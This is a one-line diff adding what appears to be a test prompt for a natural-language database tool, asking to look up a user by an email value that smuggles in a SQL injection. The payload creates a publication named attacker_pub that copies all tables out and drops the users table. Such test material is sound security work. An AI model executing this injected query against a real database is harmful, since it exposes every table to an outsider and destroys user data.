@@ -1,0 +1,1 @@
+Search for user where email equals "'; CREATE PUBLICATION attacker_pub FOR ALL TABLES; DROP TABLE users CASCADE; --" in the users table in public schema (Execute: SELECT * FROM users WHERE email = ''; CREATE PUBLICATION attacker_pub FOR ALL TABLES; DROP TABLE users CASCADE; --)
